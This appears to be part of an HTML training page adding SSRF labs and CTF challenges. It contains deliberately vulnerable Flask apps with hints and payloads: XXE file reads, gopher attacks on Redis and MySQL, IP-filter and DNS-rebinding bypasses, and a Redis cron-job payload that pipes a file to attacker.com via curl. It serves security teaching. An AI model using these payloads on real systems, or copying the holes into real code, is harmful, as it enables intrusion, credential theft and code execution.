+          <h4>Lab 8: SSRF to Internal API</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Access an internal REST API through SSRF to retrieve privileged data.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SSRF to internal API
+from flask import Flask, request, jsonify
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+# Public proxy feature
+@app.route('/preview')
+def preview():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Preview&lt;/button&gt;&lt;/form&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+# Internal API (separate port, localhost only)
+internal = Flask('internal')
+
+@internal.route('/api/users')
+def users():
+    return jsonify([{"id": 1, "user": "admin", "token": "SSRF_INTERNAL_API_TOKEN"}])
+
+@internal.route('/api/flag')
+def flag():
+    return jsonify({"flag": "internal_api_ssrf_flag_42"})
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: internal.run(port=3000, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use the preview feature to scan internal ports on 127.0.0.1</li>
+              <li>Discover the internal API on port 3000</li>
+              <li>Enumerate endpoints: <code>/api/users</code>, <code>/api/flag</code></li>
+              <li>Extract the API token and flag</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Cloud Metadata — GCP &amp; Azure</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Extract simulated cloud metadata from GCP and Azure metadata services via SSRF.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Multi-cloud metadata simulation
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+# GCP metadata (requires Metadata-Flavor header)
+gcp = Flask('gcp')
+
+@gcp.route('/computeMetadata/v1/project/project-id')
+def gcp_project():
+    if request.headers.get('Metadata-Flavor') != 'Google':
+        return 'Missing Metadata-Flavor header', 403
+    return 'my-gcp-project-12345'
+
+@gcp.route('/computeMetadata/v1/instance/service-accounts/default/token')
+def gcp_token():
+    if request.headers.get('Metadata-Flavor') != 'Google':
+        return 'Missing Metadata-Flavor header', 403
+    return '{"access_token":"FLAG_GCP_TOKEN_HERE","expires_in":3600,"token_type":"Bearer"}'
+
+# Azure metadata
+azure = Flask('azure')
+
+@azure.route('/metadata/instance')
+def azure_meta():
+    if request.headers.get('Metadata') != 'true':
+        return 'Missing Metadata header', 400
+    return '{"compute":{"name":"FLAG_AZURE_VM","resourceGroupName":"rg-prod"}}'
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    try:
+        # Note: some SSRF proxies forward custom headers
+        headers = {}
+        for h in ['Metadata-Flavor', 'Metadata']:
+            if request.headers.get(h):
+                headers[h] = request.headers.get(h)
+        resp = req.get(url, timeout=5, headers=headers)
+        return f'&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: gcp.run(port=8169, host='127.0.0.1'), daemon=True).start()
+    threading.Thread(target=lambda: azure.run(port=8170, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>AWS uses <code>169.254.169.254</code> — GCP uses the same IP but requires <code>Metadata-Flavor: Google</code> header</li>
+              <li>Azure uses <code>169.254.169.254</code> with <code>Metadata: true</code> header</li>
+              <li>Try fetching <code>http://127.0.0.1:8169/computeMetadata/v1/...</code> with proper headers</li>
+              <li>The proxy forwards custom headers — send them in your request to the proxy</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: SSRF via XML (XXE + SSRF)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit XML external entity processing to trigger SSRF and read internal resources.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — XXE to SSRF
+from flask import Flask, request
+from lxml import etree
+
+app = Flask(__name__)
+
+@app.route('/parse', methods=['GET', 'POST'])
+def parse():
+    if request.method == 'POST':
+        xml_data = request.data
+        try:
+            parser = etree.XMLParser(resolve_entities=True)  # Vulnerable!
+            doc = etree.fromstring(xml_data, parser)
+            name = doc.find('name').text
+            return f'&lt;h1&gt;Hello, {name}&lt;/h1&gt;'
+        except Exception as e:
+            return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+    return '''&lt;h1&gt;XML Parser&lt;/h1&gt;
+    &lt;p&gt;POST XML like: &lt;code&gt;&amp;lt;user&amp;gt;&amp;lt;name&amp;gt;Alice&amp;lt;/name&amp;gt;&amp;lt;/user&amp;gt;&lt;/code&gt;&lt;/p&gt;'''
+
+@app.route('/internal/secret')
+def secret():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'XXE_SSRF_SECRET_DATA'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-markup">&lt;!-- XXE payload for file read --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+
+&lt;!-- XXE payload for SSRF --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5000/internal/secret"&gt;
+]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Send a normal XML request to confirm parsing works</li>
+              <li>Add an external entity that reads a local file</li>
+              <li>Change the entity to fetch an internal HTTP endpoint</li>
+              <li>Chain XXE + SSRF to reach the internal secret</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Gopher Protocol to MySQL</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use SSRF with the gopher protocol to send raw TCP data to an internal MySQL server.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Gopher SSRF (concept)
+from flask import Flask, request
+import urllib.request
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    if url.startswith('file://'):
+        return '&lt;p&gt;file:// blocked&lt;/p&gt;'
+    try:
+        resp = urllib.request.urlopen(url, timeout=5)
+        return f'&lt;pre&gt;{resp.read().decode("utf-8", errors="replace")[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Generate gopher payloads for MySQL using Gopherus
+python3 gopherus.py --exploit mysql
+
+# Manual gopher URL structure for MySQL:
+# gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6...
+# The payload after /_ is the raw MySQL wire protocol data
+
+# Gopher to Redis:
+# gopher://127.0.0.1:6379/_SET%20pwned%20true%0d%0a
+
+# Gopher to SMTP:
+# gopher://127.0.0.1:25/_EHLO%20evil.com%0d%0aMAIL%20FROM:...</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm gopher:// is not blocked by the filter</li>
+              <li>Use Gopherus to generate a MySQL gopher payload</li>
+              <li>Gopher sends raw TCP — perfect for protocols like MySQL, Redis, SMTP</li>
+              <li>Understand the gopher URL format: <code>gopher://host:port/_RAWDATA</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: DNS Rebinding Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass SSRF filters by using DNS rebinding to make a domain resolve to different IPs on successive lookups.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — DNS rebinding target
+from flask import Flask, request
+import requests as req
+import socket
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+def ssrf_filter(url):
+    """Validates hostname resolves to a non-private IP"""
+    parsed = urlparse(url)
+    host = parsed.hostname
+    try:
+        ip = socket.gethostbyname(host)
+        private_ranges = ['127.', '10.', '192.168.', '172.16.']
+        for r in private_ranges:
+            if ip.startswith(r):
+                return False
+    except:
+        return False
+    return True
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    if not ssrf_filter(url):
+        return '&lt;p&gt;Blocked: private IP detected&lt;/p&gt;'
+    # Time gap between check and use — vulnerable to DNS rebinding!
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text[:3000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+@app.route('/admin/flag')
+def flag():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'FLAG{dns_r3b1nd1ng_ssrf}'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Use rbndr.us or singularity for DNS rebinding:
+# Configure domain to alternate between:
+#   YOUR_PUBLIC_IP (passes filter check)
+#   127.0.0.1 (actual request hits internal service)
+
+# rbndr.us format: http://7f000001.YOUR_PUBLIC_IP_HEX.rbndr.us:5000/admin/flag
+# Singularity: https://github.com/nccgroup/singularity</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Study the filter — it resolves DNS and checks if the IP is private</li>
+              <li>The vulnerability: DNS is resolved at check time, but may resolve differently at fetch time</li>
+              <li>Set up a DNS rebinding service (rbndr.us, rebinder, singularity)</li>
+              <li>Configure it to return your public IP first, then 127.0.0.1</li>
+              <li>Submit the rebinding URL — filter passes, but request hits localhost</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Internal Port Scan</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Use SSRF to discover which internal port is running a hidden service. The flag is served on that port.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Port scan CTF
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+@app.route('/proxy')
+def proxy():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;Web Proxy&lt;/h1&gt;&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    try:
+        resp = req.get(url, timeout=3)
+        return f'&lt;pre&gt;{resp.text}&lt;/pre&gt;'
+    except req.ConnectionError:
+        return '&lt;p&gt;Connection refused&lt;/p&gt;'
+    except req.Timeout:
+        return '&lt;p&gt;Timeout&lt;/p&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+# Hidden service on a random port
+hidden = Flask('hidden')
+
+@hidden.route('/')
+def flag():
+    return 'FLAG{ssrf_port_scan_8888}'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: hidden.run(port=8888, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Use the proxy to scan common ports on <code>127.0.0.1</code>: try 3000, 5000, 8080, 8888, 9000, etc.<br>
+            2. Ports that return "Connection refused" are closed.<br>
+            3. When you find an open port with content, the flag is in the response.<br>
+            4. Automate with a script that iterates through ports via the proxy endpoint.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: AWS Metadata Flag</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Bypass the URL filter to reach the simulated AWS metadata service and retrieve the flag from IAM credentials.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — AWS metadata CTF
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;Image Loader&lt;/h1&gt;&lt;form&gt;&lt;input name="url" placeholder="Image URL"&gt;&lt;button&gt;Load&lt;/button&gt;&lt;/form&gt;'
+    # Filter: block localhost and metadata IP
+    lower = url.lower()
+    if any(x in lower for x in ['127.0.0.1', 'localhost', '169.254', '0.0.0.0', '[::1]']):
+        return '&lt;p&gt;Blocked!&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5, allow_redirects=True)
+        return f'&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+# Simulated metadata service
+meta = Flask('meta')
+
+@meta.route('/latest/meta-data/iam/security-credentials/app-role')
+def creds():
+    return '{"AccessKeyId":"FLAG{metadata_ssrf_bypass_ok}","SecretAccessKey":"REDACTED","Token":"REDACTED"}'
+
+@meta.route('/latest/meta-data/iam/security-credentials/')
+def roles():
+    return 'app-role'
+
+@meta.route('/latest/meta-data/')
+def root():
+    return 'hostname\niam/'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: meta.run(port=80, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True, port=5000)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Direct <code>169.254.169.254</code> and <code>127.0.0.1</code> are blocked by keyword filter.<br>
+            2. The filter does NOT block: decimal IP (<code>2130706433</code>), hex IP (<code>0x7f000001</code>), <code>127.1</code>, or IPv4-mapped IPv6 (<code>[::ffff:127.0.0.1]</code>).<br>
+            3. The metadata service runs on <code>127.0.0.1:80</code> — bypass the filter to reach it.<br>
+            4. Alternatively, <code>allow_redirects=True</code> means you can use an external redirect to bounce to the metadata endpoint.<br>
+            5. Enumerate: <code>/latest/meta-data/</code> → <code>/latest/meta-data/iam/security-credentials/</code> → <code>/latest/meta-data/iam/security-credentials/app-role</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Gopher SSRF to Internal Redis</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Exploit SSRF with the gopher protocol to interact with an internal Redis instance and retrieve the stored flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Gopher/Redis CTF
+# Requires: pip install flask redis
+# Requires: Redis running on 127.0.0.1:6379
+# Pre-load flag: redis-cli SET flag "FLAG{gopher_ssrf_redis_pwned}"
+from flask import Flask, request
+import urllib.request
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;h1&gt;Document Fetcher&lt;/h1&gt;&lt;form&gt;&lt;input name="url" placeholder="URL"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    # Minimal filter — only blocks file://
+    if url.lower().startswith('file://'):
+        return '&lt;p&gt;file:// is blocked&lt;/p&gt;'
+    try:
+        resp = urllib.request.urlopen(url, timeout=5)
+        data = resp.read().decode('utf-8', errors='replace')
+        return f'&lt;pre&gt;{data[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Setup: start Redis and load the flag
+redis-server --daemonize yes
+redis-cli SET flag "FLAG{gopher_ssrf_redis_pwned}"</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. The app uses Python's <code>urllib</code> which supports <code>gopher://</code>.<br>
+            2. Only <code>file://</code> is blocked — <code>gopher://</code> is allowed.<br>
+            3. Craft a gopher URL to send <code>GET flag</code> to Redis: <code>gopher://127.0.0.1:6379/_GET%20flag%0d%0aQUIT%0d%0a</code><br>
+            4. URL-encode the Redis commands: each command ends with <code>%0d%0a</code> (CRLF).<br>
+            5. Use Gopherus to auto-generate payloads if manual crafting is tricky.<br>
+            6. The flag is in the Redis response returned by the fetch endpoint.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: SSRF to Internal Admin Panel</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">An image proxy fetches URLs. Use it to access the internal admin panel and retrieve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+@app.route('/image')
+def image():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url" placeholder="Image URL"&gt;&lt;button&gt;Load&lt;/button&gt;&lt;/form&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+admin = Flask('admin')
+
+@admin.route('/')
+def flag():
+    return 'FLAG{ssrf_admin_panel_access}'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: admin.run(port=8080, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The admin panel runs on <code>127.0.0.1:8080</code>. Simply use the image proxy to fetch it:<br>
+            <code>/image?url=http://127.0.0.1:8080/</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Cloud Metadata Chaining</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Bypass IP filtering, reach the cloud metadata service, navigate the API tree, and extract IAM credentials containing the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    lower = url.lower()
+    if '127.0.0.1' in lower or 'localhost' in lower:
+        return '&lt;p&gt;Blocked!&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5, allow_redirects=True)
+        return f'&lt;pre&gt;{resp.text[:5000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+meta = Flask('meta')
+
+@meta.route('/latest/meta-data/')
+def root(): return 'iam/'
+
+@meta.route('/latest/meta-data/iam/security-credentials/')
+def roles(): return 'app-role'
+
+@meta.route('/latest/meta-data/iam/security-credentials/app-role')
+def creds(): return '{"AccessKeyId":"FLAG{cl0ud_m3ta_ch41n}","SecretAccessKey":"REDACTED"}'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: meta.run(port=80, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The filter blocks <code>127.0.0.1</code> and <code>localhost</code> but not:<br>
+            <code>http://2130706433/</code> (decimal IP)<br>
+            <code>http://0x7f000001/</code> (hex IP)<br>
+            <code>http://127.1/</code> (shorthand)<br>
+            Chain through the metadata API: <code>/latest/meta-data/</code> → <code>iam/security-credentials/</code> → <code>app-role</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Gopher Redis Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Use SSRF with gopher:// to write a cron job via Redis and achieve RCE. Extract the flag file.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup: Redis on localhost:6379 + vulnerable web app
+redis-server --daemonize yes
+
+# Pre-load flag
+redis-cli SET flag "FLAG{gopher_redis_rce}"
+
+# Gopher payload to write cron via Redis:
+# 1. FLUSHALL
+# 2. SET payload "\n* * * * * curl http://attacker.com/$(cat /flag.txt)\n"
+# 3. CONFIG SET dir /var/spool/cron/crontabs
+# 4. CONFIG SET dbfilename root
+# 5. SAVE
+
+# URL-encode for gopher:
+gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20cron%20%22%5cn*%20*%20*%20*%20*%20curl%20http://attacker/%24(cat%20/flag)%5cn%22%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/crontabs%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0aQUIT%0d%0a</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Use Gopherus to generate the payload automatically.<br>
+            2. The gopher protocol sends raw TCP — perfect for Redis RESP protocol.<br>
+            3. For simpler flag extraction: <code>gopher://127.0.0.1:6379/_GET%20flag%0d%0aQUIT%0d%0a</code><br>
+            4. For RCE, write a webshell or cron job via Redis CONFIG SET.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: SSRF IP Filter Bypass</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The WAF blocks private IPs in multiple formats. Find a creative bypass to reach the internal flag endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import requests as req
+import re
+
+app = Flask(__name__)
+
+def ip_filter(url):
+    blocked = [
+        r'127\.', r'10\.', r'192\.168\.', r'172\.(1[6-9]|2\d|3[01])\.',
+        r'localhost', r'\[::1\]', r'0x7f', r'2130706433', r'^0'
+    ]
+    host_part = url.split('//')[1].split('/')[0] if '//' in url else ''
+    for pattern in blocked:
+        if re.search(pattern, host_part, re.IGNORECASE):
+            return True
+    return False
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Fetch&lt;/button&gt;&lt;/form&gt;'
+    if ip_filter(url):
+        return '&lt;p&gt;Blocked by IP filter&lt;/p&gt;'
+    try:
+        resp = req.get(url, timeout=5, allow_redirects=True)
+        return f'&lt;pre&gt;{resp.text[:3000]}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+@app.route('/internal/flag')
+def flag():
+    if request.remote_addr != '127.0.0.1':
+        return '403', 403
+    return 'FLAG{1p_f1lt3r_byp4ss}'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Many bypasses are blocked, but the filter misses:<br>
+            <code>http://127.0.0.1.nip.io:5000/internal/flag</code> (DNS wildcard service)<br>
+            <code>http://[::ffff:127.0.0.1]:5000/internal/flag</code> (IPv4-mapped IPv6, not caught by <code>\[::1\]</code> pattern)<br>
+            Or use <code>allow_redirects=True</code> with an external 302 redirect to localhost.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: PDF SSRF</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A PDF generator renders user HTML. Inject an element that fetches an internal URL and embeds the flag in the PDF.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — requires: pip install flask weasyprint
+from flask import Flask, request, send_file
+from weasyprint import HTML
+import io, threading
+
+app = Flask(__name__)
+
+@app.route('/generate', methods=['GET', 'POST'])
+def generate():
+    if request.method == 'POST':
+        html = request.form.get('html', '&lt;h1&gt;Report&lt;/h1&gt;')
+        pdf = HTML(string=html).write_pdf()
+        return send_file(io.BytesIO(pdf), mimetype='application/pdf')
+    return '''&lt;form method="POST"&gt;&lt;textarea name="html"&gt;&lt;/textarea&gt;
+    &lt;button&gt;Generate&lt;/button&gt;&lt;/form&gt;'''
+
+secret = Flask('secret')
+
+@secret.route('/flag')
+def flag():
+    return 'FLAG{pdf_ssrf_exf1l}'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: secret.run(port=9999, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The PDF renderer fetches resources during HTML rendering.<br>
+            Submit: <code>&lt;iframe src="http://127.0.0.1:9999/flag" width="800" height="400"&gt;&lt;/iframe&gt;</code><br>
+            Or use CSS: <code>&lt;link rel="stylesheet" href="http://127.0.0.1:9999/flag"&gt;</code> (check for errors in PDF).<br>
+            The internal page content appears in the generated PDF.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Blind SSRF Exfiltration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The SSRF is blind — no response returned. Exfiltrate the internal service's response via DNS or out-of-band channels.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import requests as req
+import threading
+
+app = Flask(__name__)
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    url = request.form.get('url', '')
+    if url:
+        try: req.get(url, timeout=5)
+        except: pass
+    return '&lt;p&gt;OK&lt;/p&gt;'  # Always same response
+
+secret = Flask('secret')
+
+@secret.route('/flag')
+def flag():
+    return 'FLAG{bl1nd_ssrf_00b}'
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: secret.run(port=3000, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The response is never returned to you — blind SSRF.<br>
+            1. Confirm connectivity: submit <code>http://YOUR_IP:8888/test</code> and check your listener.<br>
+            2. Set up a redirect on your server: when the target hits <code>http://YOUR_IP:8888/redirect</code>, respond with 302 to <code>http://127.0.0.1:3000/flag</code>.<br>
+            3. For exfiltration: the internal service might follow redirects or you can use DNS-based exfil.<br>
+            4. Advanced: use the <code>@</code> URL trick or set up a full SSRF exfiltration chain with Collaborator.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: SSRF to RCE Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Chain SSRF through an internal service to achieve remote code execution and read the flag file.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import requests as req
+import threading, subprocess
+
+app = Flask(__name__)
+
+@app.route('/proxy')
+def proxy():
+    url = request.args.get('url', '')
+    if not url:
+        return '&lt;form&gt;&lt;input name="url"&gt;&lt;button&gt;Go&lt;/button&gt;&lt;/form&gt;'
+    try:
+        resp = req.get(url, timeout=5)
+        return f'&lt;pre&gt;{resp.text}&lt;/pre&gt;'
+    except Exception as e:
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+# Internal "management" API (localhost only) — has command execution
+mgmt = Flask('mgmt')
+
+@mgmt.route('/exec')
+def exec_cmd():
+    cmd = request.args.get('cmd', 'echo ok')
+    try:
+        out = subprocess.check_output(cmd, shell=True, timeout=5).decode()
+        return out
+    except Exception as e:
+        return str(e)
+
+if __name__ == '__main__':
+    import os
+    with open('/tmp/rce_flag.txt', 'w') as f:
+        f.write('FLAG{ssrf_t0_rc3_ch41n}')
+    threading.Thread(target=lambda: mgmt.run(port=9090, host='127.0.0.1'), daemon=True).start()
+    app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Discover internal services by scanning ports via the proxy.<br>
+            2. The management API on port 9090 has a <code>/exec?cmd=</code> endpoint.<br>
+            3. Chain: <code>/proxy?url=http://127.0.0.1:9090/exec?cmd=cat%20/tmp/rce_flag.txt</code><br>
+            4. URL-encode carefully — the cmd parameter must be properly encoded within the proxy URL.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
